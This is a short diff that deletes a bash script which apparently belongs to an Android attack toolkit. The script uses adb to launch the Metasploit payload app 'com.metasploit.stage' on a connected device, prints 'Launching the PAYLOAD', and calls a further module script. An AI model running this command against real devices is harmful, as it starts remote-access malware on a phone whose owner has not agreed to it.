@@ -1,6 +1,0 @@
-#!/bin/bash
-
-adb shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 | echo -e "\e[1;93mLaunching the PAYLOAD.\e[0m"
-echo
-echo
-bash modules/funtion2.sh
